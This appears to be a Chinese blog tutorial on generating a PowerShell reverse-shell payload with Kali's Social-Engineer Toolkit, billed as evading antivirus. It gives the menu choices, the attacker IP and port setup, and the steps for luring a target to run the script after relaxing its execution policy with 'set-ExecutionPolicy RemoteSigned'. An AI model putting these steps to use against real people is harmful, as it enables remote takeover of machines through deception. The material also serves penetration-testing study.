# 原创
：  【kali-权限提升】（4.2.5）社会工程学工具包：PowerShell攻击向量（防报毒）

# 【kali-权限提升】（4.2.5）社会工程学工具包：PowerShell攻击向量（防报毒）

**目录**

[一、PowerShell攻击向量](#%E4%B8%80%E3%80%81PowerShell%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F)

[概述：](#%E6%A6%82%E8%BF%B0%EF%BC%9A)

[1.1、第一步：启动SET](#2.1%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%90%AF%E5%8A%A8SET)

[1.2、第二步：选择模块](#2.2%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E9%80%89%E6%8B%A9%E6%A8%A1%E5%9D%97)

[1.3、第三步：payload选择](#2.3%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9Apayload%E9%80%89%E6%8B%A9)

[1.4、第四步：payload设置](#1.4%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9Apayload%E8%AE%BE%E7%BD%AE)

[ 1.5、第五步：攻击过程](#%C2%A01.5%E3%80%81%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B)

---


## 一、PowerShell攻击向量

> 
<h3>概述：</h3>
在社会工程学中，使用基于Java的PowerShell攻击向措是非常重要的
如果目标主机没有运行Java, 则不能欺骗它访问攻击主机社会工程学的页面，将不能进行攻击。需要使用其他方法， 即向目标主机发送病毒文件。使用PowerShell攻击向量可以创建PowerShell文件， 并将创建好的文件发送给目标。当目标运行时， 就可以获取一个远程连接
<hr/>
利用工具生成的可执行 powershell 脚本文件，诱使目标运行该文件，实现对目标攻击。powershell 攻击适用于 Win7 和 Win10、win11系统使用，因为 PowerShell 脚本可以很容易的将 ShellCode 注入到目标的物理内存中，使用该载荷攻击不会触发病毒报警


> 
<h3>1.1、第一步：启动SET</h3>
输入sudo setoolkit
（或者在工具菜单中找到后打开）

输出的信息详细的介绍了SET。该信息在第一次运行时， 才会显示
接受这部分信息后， 才可进行其他操作。
<hr/>
输入y

 显示了社会工程学工具包的创建者、版本、代号及菜单信息
选择相应的编号进行操作


<pre><code>   1) Social-Engineering Attacks
社会工程攻击
   2) Penetration Testing (Fast-Track)
渗透测试（快速轨道）
   3) Third Party Modules
第三方模块
   4) Update the Social-Engineer Toolkit
更新社交工程工具包
   5) Update SET configuration
更新设置配置
   6) Help, Credits, and About
帮助，学分等
</code></pre>



> 
<h3>1.2、第二步：选择模块</h3>
选择攻击社会工程学，在菜单中的编号为1
输入1
显示了攻击社会工程学的菜单选项， 这时就可以选择攻击工程学的类型， 然后进行攻击
<img alt="" height="597" src="https://img-blog.csdnimg.cn/b4b2f6f7a78b49d4a13ec4b72bb83639.png" width="873"/> <img alt="" height="257" src="https://img-blog.csdnimg.cn/afab3c9ee3244c4687032a02b751c9d1.png" width="870"/>
<pre><code>   1) Spear-Phishing Attack Vectors
鱼叉式钓鱼攻击向量
   2) Website Attack Vectors
网站攻击向量
   3) Infectious Media Generator
感染性媒体生成器
   4) Create a Payload and Listener
创建有效载荷和侦听器
   5) Mass Mailer Attack
大众邮件攻击
   6) Arduino-Based Attack Vector
基于Arduino的攻击向量
   7) Wireless Access Point Attack Vector
无线访问点攻击矢量
   8) QRCode Generator Attack Vector
二维码攻击向量
   9) Powershell Attack Vectors
Powershell攻击向量
  10) Third Party Modules
第三方模块
</code></pre>


> 
<h3>1.3、第三步：payload选择</h3>
输入编号9，Powershell攻击向量
显示如下


<pre><code>   1) Powershell Alphanumeric Shellcode Injector
powershell字母数字壳码注射器
   2) Powershell Reverse Shell
Powershell反向外壳
   3) Powershell Bind Shell
powershell绑定壳
   4) Powershell Dump SAM Database
powershell dump sam数据库
</code></pre>
 


> 
<h3>1.4、第四步：payload设置</h3>
选择的Powershell反向外壳

输入2
输入ip和端口（都是攻击机的，端口默认443）
生成到了下面目录
/root/.set/reports/powershell


 
 需要使用root权限打开文件夹

 


> 
<h3> 1.5、第五步：攻击过程</h3>
使用各种方法，传递到目标主机上
并执行
（我放到了自己的共享文件上）

在物理机上打开Powershell 

将txt后缀改为ps2把，方便后面运行，如果是txt，它就会弹出文件内容
<hr/>
运行命令get-ExecutionPolicy
显示Restricted，表示状态是禁止的

解决：
需要以管理员身份执行命令：set-ExecutionPolicy RemoteSigned 并输入y 
然后运行
.\powershell.reverse.ps2 
目标连接上后，就可以在kali客户端执行shell命令了



